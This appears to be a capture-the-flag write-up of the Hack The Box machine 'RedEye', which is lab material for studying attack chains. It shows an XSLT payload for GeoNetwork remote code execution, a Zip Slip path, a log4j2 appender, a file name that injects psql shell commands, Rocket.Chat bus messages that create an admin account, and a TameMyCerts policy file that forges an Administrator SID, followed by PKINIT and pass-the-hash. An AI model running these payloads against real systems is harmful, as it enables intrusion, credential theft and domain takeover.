---
title: "HTB RedEye: unauthenticated GeoNetwork RCE, the Rocket.Chat bus and a forged SID in TameMyCerts"
summary: "Three machines behind a single front end. GeoNetwork gives unauthenticated code execution, the raster2pgsql spool gives the gisops account, and TameMyCerts' policy directory lets any Domain User issue a certificate carrying the Administrator SID."
date: 2026-11-16
lang: en
target: "HTB RedEye (10.129.28.102 → 10.129.28.183)"
tags: ["adcs", "pkinit", "geonetwork", "rce", "active-directory", "sql-injection"]
pair: htb-redeye
draft: false
---

## Reconnaissance

The front is `10.129.28.102`, but it is not the target: it is DC01's external NIC, with DNAT into the internal network. The box was redeployed mid-session to `10.129.28.183`; the layout did not change, only the address.

```bash
nmap -Pn -sT -p- --min-rate 500 -T4 --open 10.129.28.102
```

| Port | Service | Note |
| --- | --- | --- |
| 22 | SSH | GN01, the Ubuntu host |
| 80 | HTTP | `geo.airways.htb`, GeoNetwork 4.4.11 |
| 443 | HTTPS | `sts.airways.htb`, ADFS on DC01 |
| 3000 | HTTP | `chat.airways.htb`, Rocket.Chat 8.8.0 |

Behind that, three hosts on `192.168.100.0/24`: **DC01** (`.1`, Windows Server 2022, Domain Controller), **GN01** (`.2`, Ubuntu running GeoNetwork and Rocket.Chat) and **WKSTN01** (`.3`, a Windows workstation). The front exposes no 445, 636 or 135. Port 443 terminates on DC01's ADFS, but without a credential that is just a login page. The path that gave execution was GN01, and that is exactly where the first RCE lands.

## GeoNetwork's formatter runs code without authentication

The first endpoint that answered without a session was the formatter upload:

```http
POST /geonetwork/srv/api/formatters HTTP/1.1
Host: geo.airways.htb
Cookie: XSRF-TOKEN=<anonymous token>
X-XSRF-TOKEN: <anonymous token>
Content-Type: multipart/form-data

file=@i387x137.zip;type=application/zip
```

The only control is the anonymous XSRF cookie. The accepted bundle carries a `view.xsl` that Saxon evaluates with Java extensions enabled. `java.lang.Runtime.exec` is one line away:

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="java:java.lang.Runtime">
  <xsl:template match="/">
    <xsl:result-document href="file:///tmp/xcmd.sh" method="text">
      { id; uname -a; ps -ef; } > /var/lib/geonetwork/data/resources/htmlcache/i387.txt 2>&1
    </xsl:result-document>
    <xsl:value-of select="rt:exec(rt:getRuntime(),'/bin/sh /tmp/xcmd.sh')"/>
  </xsl:template>
</xsl:stylesheet>
```

`result-document` writes the script, `rt:exec` calls the shell, and the formatter render triggers it with a `GET` on the record. The output comes back at `/geonetwork/htmlcache/<name>.txt`:

```text
uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
GN01
```

That is the unauthenticated RCE in finding 10. From here every command is a request, and GN01 reaches `192.168.100.1` and `192.168.100.3`.

## Zip Slip, log4j2 and a channel that stays up

The formatter render works, but it depends on the XSLT engine and a valid record id. To turn it into a stable channel I came back to the same upload with a different intent: arbitrary write.

The bundle extraction uses the backslash separator without normalizing the path. An entry with eight `..\` climbs from `/var/lib/geonetwork/data/formatter/<fmt>` to the root and writes wherever I want. The useful target is the exploded webapp:

```text
..\..\..\..\..\..\..\..\opt\geonetwork\apps\geonetwork\WEB-INF\classes\i217.sh
```

The upload returns 500 but writes the file before complaining, and the error hands back the resolved path:

```json
{"message":"/var/lib/geonetwork/data/formatter/k1/../../../../../../../../opt/geonetwork/apps/geonetwork/i123_marker.txt","code":"runtime_exception"}
```

With write access to `WEB-INF/classes`, the next step is the classpath. I planted a log4j2 XML whose `packages="org.fao.geonet.api"` registers a custom appender, plus a compiled `@Plugin` class in the same package. The `system/server/log` setting accepts the resource name, and the ADFS SSO already gave us a GeoNetwork session:

```http
POST /geonetwork/srv/api/site/settings HTTP/1.1
Host: geo.airways.htb
Content-Type: application/x-www-form-urlencoded

system/server/log=log4j2-evil.xml
```

`LogUtils.refreshLogConfiguration` loads the resource from the classpath and applies it to the `LoggerContext`. The appender runs the command in `cmd.txt` as uid 999. What was a render-dependent RCE became a repeatable channel, with the same user and without touching the service.

The inventory reads like this: 10 is the initial RCE, 106 is the Zip Slip, 127 and 135 are the log4j2 execution. The distinction matters because the write primitive is what survives when the render breaks.

## From geonetwork to gisops

GN01 runs the GIS stack: PostGIS, a spool at `/srv/gis/spool/incoming` and `aodb-ingest.service`, triggered by `aodb-ingest.path`. The service runs as `gisops` and builds the command like this:

```bash
layer=$(basename "${src%.*}")
raster2pgsql -s 4326 -d -I -C -F -t 256x256 "$src" "gis.${layer}" \
  | psql -q -d geonetwork_db -U gis_etl
```

The table name comes from the file name, unquoted. `psql` is not just a SQL consumer: it interprets meta-commands. A `\!` in the stream runs a shell command in the client process, which is `gisops` — not the `gis_etl` database user.

The file does not need to be a valid TIFF. The name is enough:

```text
z";\! s=$(pwd | cut -c1); sh ${s}srv${s}gis${s}spool${s}incoming${s}g.sh;-- .tif
```

`g.sh` runs as `gisops` (uid 997). The next target was next door: `/etc/airport-gis/notify.env`, `root:gisops`, mode 0640, readable by `gisops`.

```text
RC_USER=...
RC_PASS=<redacted>
```

The Rocket.Chat password was `gabby.t`'s domain password. The LDAPS bind on 636 returned `rc=0`, and the domain had `lockoutThreshold=0` — no lockout for anyone testing. Finding 22 gives the shell, finding 37 gives the account.

## Rocket.Chat: the local bus is not a boundary

With code on GN01, `127.0.0.1:36657` stops being local. It is the Moleculer TCP transporter Rocket.Chat uses for its internal bus, and it accepts packets without authentication. The framing is simple: a six-byte header, XOR of the first five bytes into byte zero, a big-endian length and a type.

The event that matters is `broadcast` on the `local` stream, aimed at `watch.settings`. The MeteorService handler calls `settings.set(record)` straight into the in-memory cache. You do not need to be an admin to publish on the bus; you need to be an admin for the result to be useful, and the result creates the admin:

```json
{"clientAction":"updated","setting":{"_id":"Accounts_RegistrationForm","value":"Public"}}
{"clientAction":"updated","setting":{"_id":"Accounts_ManuallyApproveNewUsers","value":false}}
{"clientAction":"updated","setting":{"_id":"Accounts_Registration_Users_Default_Roles","value":"admin"}}
```

After that, `POST /api/v1/users.register` creates an ordinary account. The account is born with the `admin` role because public registration now defaults to `admin`. `GET /api/v1/users.list` confirms it:

```json
{"username":"i153adm25199","roles":["admin"],"active":true}
```

That is finding 171. The same channel also accepts `watch.integrations` with `clientAction: inserted`, which lets you insert an outgoing webhook without going through the API. I did not need to go further for the domain chain, but the primitive is there.

## The domain, WKSTN01 and user.txt

With `gabby.t`, AD enumeration over LDAPS 636 was direct: users, groups, ACLs, DNS zones, templates. Two findings changed the map.

The first was the `airwayhtb` ADIDNS zone. `Authenticated Users` has `CreateChild` on the zone node, so `gabby.t` created a wildcard `*` record pointing at `192.168.100.2`. DC01's DNS then served that A record for any nonexistent name within about 30 seconds. That is passive NTLM coercion: any DC01 service resolving a name that does not exist authenticates to GN01. Existing host records are not writable (`rc=50`) and unsigned dynamic updates are refused (`rcode=9`). The LDAPS relay and RBCD were staged, but they did not close the chain; it stays documented as finding 212 and as a negative.

The second was `isabel.o`. The account is a **direct** member of `BUILTIN\Administrators` on WKSTN01 (RID 1638):

```text
S-1-5-21-4146114734-3004133792-201478249-500   WKSTN01\Administrator
S-1-5-21-829808936-2739584302-670142182-512    AIRWAYS\Domain Admins
S-1-5-21-829808936-2739584302-670142182-1638   AIRWAYS\isabel.o
```

With `isabel.o`'s domain credential, administrative SMB opened `C$` and `ADMIN$`, and `user.txt` was on the local Administrator's desktop. I verified it twice, including over SAMR, and the contrast with `gabby.t` is the test that separates privilege from coincidence:

```text
ISABEL USER_TXT_LEN: 34
GABBY C$: ERR 0xc0000022 STATUS_ACCESS_DENIED
```

On DC01, `isabel.o` also had RDP, `GP Management` and a writable policy directory. That was not Domain Admin by itself, but it was the missing piece for the next step.

The route to writing on DC01 was an RDP session as `isabel.o` with a looping `cmd`: it fetched jobs from the GN01 listener, ran them and posted the output back. That beacon created `User.xml`; the certificate request left GN01 over DCOM/TCP 135, with the same account.

## ADCS: a forged SID in the policy directory

The `AIRWAYS-DC01-CA` CA uses the `TameMyCerts.Policy` policy module with `PolicyDirectory = C:\PolicyFiles`. The scheme is `<TemplateName>.xml`, reloaded **on every request**, with no service restart.

The ACL is the problem: `BUILTIN\Users` has `(CI)(AD)` and `(CI)(WD)`, which means it can create new files. Existing ones, such as `GroupPolicy_Audit.xml`, are immutable — which gives the false impression that the directory is protected. The `User` template is enrollable by Domain Users and carries a client-auth EKU.

I created `C:\PolicyFiles\User.xml` as `isabel.o`, with two parts. The first clears the SAN the requester already sends: rules with `Value=""` and `Force=true` remove isabel's UPN and rfc822Name, and the next rule injects the Administrator UPN. The second adds the SID extension (`1.3.6.1.4.1.311.25.2`) with the DER for SID `-500`:

```xml
<CertificateRequestPolicy>
  <OutboundSubjectAlternativeName>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>rfc822Name</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value>Administrator@airways.htb</Value>
      <Mandatory>true</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
  </OutboundSubjectAlternativeName>
  <CustomCertificateExtensions>
    <CustomCertificateExtension>
      <Oid>1.3.6.1.4.1.311.25.2</Oid>
      <Value>MD2gOwYKKwYBBAGCNxkCAaAtBCtTLTEtNS0yMS04Mjk4MDg5MzYtMjczOTU4NDMwMi02NzAxNDIxODItNTAw</Value>
    </CustomCertificateExtension>
  </CustomCertificateExtensions>
</CertificateRequestPolicy>
```

The detail that burned the first attempt was the leftover SAN. Requesting a certificate with SAN `isabel` and SID `-500` returned `KDC_ERR_CLIENT_NAME_MISMATCH`: the KDC matched the requester's name, not the SID. Removing isabel's UPN and rfc822Name SANs with the `Value=""` rules fixed it. The second request, REQID=30, template `User`, RSA-2048 over DCOM/TCP 135, came back:

```text
DISP=0x3 REQID=30 MSG='Issued'
SAN=<OtherName(1.3.6.1.4.1.311.20.2.3, 'Administrator@airways.htb')>
SIDEXT=<DER for S-1-5-21-829808936-2739584302-670142182-500>
```

The certificate belongs to isabel, but it says it is the Administrator. PKINIT believes the SID:

```bash
certipy auth -pfx adm.pfx -username Administrator -dc-ip 192.168.100.1
```

```text
Got TGT
Got hash for 'administrator@airways.htb': <redacted>
```

The rest is pass-the-hash. SMB to DC01 as `airways.htb/Administrator`, `C$`, and `root.txt` on the desktop. Domain Users to Domain Admin, with no CA restart and no interaction.

## What closed

The box is large, and most of the time went into routes that did not close. Worth recording so they are not repeated:

- **ESC1–ESC8** were not available; the `OfflineRouter` template had a suppliable SAN, but no enrollment right.
- **ESC13/GPO**: `GPO-Auditors` was a honeypot, and the ACL sweep with the correct SD parser produced no useful `WriteProperty` on a GPO linked to the DC.
- **LDAP relay 389** does not exist; only LDAPS. Classic RPC coercion had no Spooler, FSRVP, WebClient or EFSRPC.
- **ADIDNS → LDAPS → RBCD** was built up to the wildcard, but no DC01 service resolved the nonexistent name inside the window.
- **SQL on DC01**: WID only, no TCP 1433.
- **The Administrator DCC2** was exhausted in the crack; WKSTN01 `DPAPI`/Vault gave nothing usable.
- **Privileged built-in groups** were empty. **ADFS `/policy`** refused the actions. **Root on GN01** and the **scheduled-task XML hijack** did not land.
- The box also went down mid-session and came back on a different IP. The redeploy did not change the state of the domain.

## What I would carry to the next target

The CA policy directory is the codification of a simple idea: if the module reads a file whose name the attacker chooses, and the directory accepts new files, the attacker controls the policy. There is no need to write to the service or restart anything. The fix is an ACL restricted to Administrators/SYSTEM and a policy that does not let the requester impose a SAN or the SID extension.

The second detail is the KDC. A certificate with SID `-500` is not an Administrator certificate: it is someone else's certificate claiming to be the Administrator. PKINIT does not validate the requester's identity against the SID when the policy module rewrites it. Monitoring for issuances where the SID differs from the requester, and for PKINIT by privileged accounts outside the baseline, is what remains.

The third is the boundary. `127.0.0.1` is not authentication once you have code on the host. The Moleculer transporter, the settings cache and public registration form a three-step chain that creates an admin from nothing. The same reasoning applies to `notify.env`: a chat service password was a person's domain password, and the domain had no lockout.

Finally, `raster2pgsql`: a file name is not a trusted identifier. `psql`'s `\!` turns a table-name injection into a shell. If the service runs as a service account, the database is the least of the problems.